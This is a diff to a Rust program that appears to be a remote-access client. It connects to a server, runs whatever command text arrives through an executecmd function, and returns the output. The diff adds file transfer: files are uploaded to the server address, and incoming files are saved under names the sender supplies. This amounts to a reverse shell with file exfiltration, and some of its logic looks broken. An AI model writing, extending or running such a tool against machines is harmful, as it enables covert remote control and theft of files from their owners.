@@ -49,10 +49,52 @@ fn executecmd(cmd:&str) -> String{
     }
 }
 
+use std::io::{Read};
+use std::path::Path;
+fn handle_client_tx(mut stream: TcpStream){
+    let mut filename = [0; 128];
+    let bytes_read = stream.read(&mut filename).unwrap();
+    let original_filename = std::str::from_utf8(&filename[..bytes_read]).unwrap().trim();
+    println!("Received file {}", original_filename);
+    let mut newfilname = String::from(original_filename);println!("File {}", newfilname);
+    let mut file = std::fs::File::create(original_filename).unwrap();
+    let mut buffer = [0; 1024];
+    loop {
+        let bytes_read = stream.read(&mut buffer).unwrap();
+        if bytes_read == 0 {
+            break;
+        }
+        let data = &buffer[..bytes_read];
+        file.write_all(data).unwrap();
+    }
+    println!("Saved file {}", original_filename);
+}
+
+ fn clienttx(filenm: String, serveraddresstx: String) {
+    println!("inside loop");
+    let mut listener = TcpListener::bind(serveraddresstx.clone()).unwrap();
+    println!("sver check: {}", serveraddresstx);
+    println!("Binded");
+    for stream in listener.incoming() {
+        println!("in Stream");
+        match stream {
+            Ok(stream) => { println!("in Stream");
+                std::thread::spawn(|| {
+                    println!("handling client fcn");
+                    handle_client_tx(stream);
+                });  return drop(listener);
+            }
+            Err(e) => {
+                println!("Error: {}", e);
+            }
+        }
+    }
+    drop(listener);
+}
+
 use std::fs;
 use std::io::prelude::*;
-use std::path::Path;
-fn send_to_server(socket: TcpStream, filename: & str) -> std::io::Result<()> {
+fn send_to_server(socket:&mut TcpStream, filename: & str) -> std::io::Result<()> {
     let file_path = Path::new(filename);
     let mut file = File::open(&file_path)?;
     let mut contents = Vec::new();
@@ -159,7 +201,6 @@ async fn main() {
         reader.read_until(b'\0', &mut buffer);
         println!("reciever from server: {}", String::from_utf8_lossy(&buffer).trim());
         let text : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
-        //assert_eq!("dl", &text, "we are testing if dl with {} and {}", "dl", &text);
         if buffer.len()==0 ||
         &text=="quit"{
             println!("break");
@@ -184,22 +225,17 @@ async fn main() {
             println!("Files downloaded...");
         }
 
-        if &text=="tx"{ //donwloading from server 
+        if &text=="tx"{ //downloading from server 
             let mut buffer:Vec<u8> = Vec::new();
             let mut reader = BufReader::new(&client);
             reader.read_until(b'\0', &mut buffer);
-            println!("reciever from server in rx 1: {}", String::from_utf8_lossy(&buffer).trim());
+            println!("reciever file downloading: {}", String::from_utf8_lossy(&buffer).trim());
             let urltext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
-            println!("ooutput rx url capture check: {}", urltext);
-            let mut buffer:Vec<u8> = Vec::new(); println!("ooutput rx url capture check 2: {}", urltext);
-            let mut reader = BufReader::new(&client); println!("ooutput rx url capture check 3: {}", urltext);
-            reader.read_until(b'\0', &mut buffer); println!("ooutput rx url capture check 4: {}", urltext);
-            println!("reciever from server in rx mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
+            let mut buffer:Vec<u8> = Vec::new();
+            let mut reader = BufReader::new(&client);
             let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
-            //println!("ooutput dl fn capture check: {}", fntext);
             println!("recieving files...");
-            let fntext : String = String::from("0.0.0.0");
-            //tx_file(&Client::new(), &urltext, &fntext).await.unwrap();
+            clienttx(fntext, serveraddresstx.clone());
             println!("Files downloaded...");
         }
 
@@ -209,17 +245,16 @@ async fn main() {
             reader.read_until(b'\0', &mut buffer);
             println!("reciever from server in tx 1: {}", String::from_utf8_lossy(&buffer).trim());
             let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
-            println!("ooutput fntext capture check: {}", fntext);
             let mut buffer:Vec<u8> = Vec::new();
             let mut reader = BufReader::new(&client);
             //reader.read_until(b'\0', &mut buffer);
             println!("reciever from server in rx mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
             let fnpath : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
-            println!("ooutput dl fpath capture check: {}", fnpath);
             println!("sending files...");
-            send_to_server(TcpStream::connect(serveraddresstx.to_string()).unwrap(), &fntext);
+            send_to_server(&mut TcpStream::connect(serveraddresstx.to_string()).unwrap(), &fntext);
             println!("sent to server...");
         }
+        
         let mut output =executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
         output.push('\0');
         client.write(&mut output.as_bytes());
